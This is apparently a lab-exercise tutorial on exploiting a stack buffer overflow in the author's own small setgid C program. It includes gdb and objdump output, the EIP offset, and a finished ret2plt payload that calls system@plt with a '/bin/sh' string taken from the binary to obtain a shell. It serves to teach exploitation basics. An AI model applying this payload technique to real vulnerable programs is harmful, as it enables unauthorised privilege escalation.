# Build your own `system()`

Well, life is tough. Unlike in the first overflow exercise, there's no included function that you can call to get a shell. But let's try and get a shell anyways.

```C
# include<stdio.h>
# include<stdlib.h>
# include<string.h>

int main(int argc, char **argv) {
    if (argc>1) {
        gid_t gid = getegid();
        setresgid(gid, gid, gid);
        printf("Good thing you don't have /bin/sh");
        printf("\nGood luck getting a shell.\n");
        system("echo You Lose!\n");
        char buf[24];
        strcpy(buf,argv[1]);
    }
    return 0;
}
```

Now unlike the last problem, you might notice that there is no call to `system("/bin/sh")`. This means we're going to have to be a bit more clever.

Let's take a look at the disassembly to learn a bit more about `system()`

```gdb
$ gdb -q ./overflow
Reading symbols from ./overflow...(no debugging symbols found)...done.
gdb-peda$ disas main
Dump of assembler code for function main:
...
   0x0804853c <+47>:   call   0x8048400 <setresgid@plt>
   0x08048541 <+52>:    movl   $0x8048620,(%esp)
   0x08048548 <+59>:    call   0x8048390 <printf@plt>
   0x0804854d <+64>:    movl   $0x8048642,(%esp)
   0x08048554 <+71>:    call   0x80483c0 <puts@plt>
   0x08048559 <+76>:    movl   $0x804865e,(%esp)
   0x08048560 <+83>:    call   0x80483d0 <system@plt>
```

Now what is `system@plt`? This is a crucial part. This binary is dynamically linked. This means that the binary makes calls to an actual libc file that gets put into memory. Luckily for us, dynamically linked binaries have PLT stubs. Since ASLR randomizes libc addresses as well, the binary needs some way to reliably call the functions it uses. The PLT is a wrapper function for the actual code in libc. **The PLT is a part of the binary, it's address doesn't change.** If you call `system@plt`, you'll call `system()`. So how are we going to do this? Since the PLT is a part of the binary, we'll use `objdump`.

```objdump
$ objdump -d overflow | grep system
080483d0 <system@plt>:
 8048560:   e8 6b fe ff ff          call   80483d0 <system@plt>
```

Now let's try to break the binary.

```salt
$ strace ./overflow $(python -c 'print "A"*44')
...
--- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x41414141} ---
```

We get control of `$eip` after 40 bytes. `$eip` is the instruction pointer register. This is the same as overwriting a return value. It simply means that we have control over the control flow. Now let's supply our address.

```shell
./overflow $(python -c 'print "A"*40 + "\xd0\x83\x04\x08"')
Good thing you don't have /bin/sh
Good luck getting a shell.
You Lose!
sh: 1: ������: not found
Segmentation fault (core dumped)
```

Now this is really weird. What happened here is that we called `system()`. We didn't provide any arguments for `system()` so it just pulled some junk from the stack. Calling a function in an exploit has to take this form:

\[address of function\] \[return address\] \[argument\]

Now when the programmer wrote this, (I wrote this one :P) he thought he could be smart and make fun of you for not having a `"/bin/sh"` string. However, he didn't realize that by including that string in the code, the string is in the binary. We can use `gdb` to find the string!

```gdb
$ gdb -q ./overflow
Reading symbols from overflow...(no debugging symbols found)...done.
gdb-peda b*main
Breakpoint 1 at 0x804850d
gdb-peda$ r
Breakpoint 1, 0x0804850d in main ()
gdb-peda$ find /bin/sh
Searching for '/bin/sh' in: None ranges
Found 3 results, display max 3 items:
overflow : 0x804863a ("/bin/sh")
overflow : 0x804963a ("/bin/sh")
    libc : 0xf7f82a24 ("/bin/sh")
```

Now you'll notice that two of these are in the binary. I'll just pick the first one and run with it. Finally, our finished exploit looks like so:

```shell
./overflow $(python -c 'print "A"*40 + "\xd0\x83\x04\x08" + "FAKE" +
"\x3a\x86\x04\x08"')
```
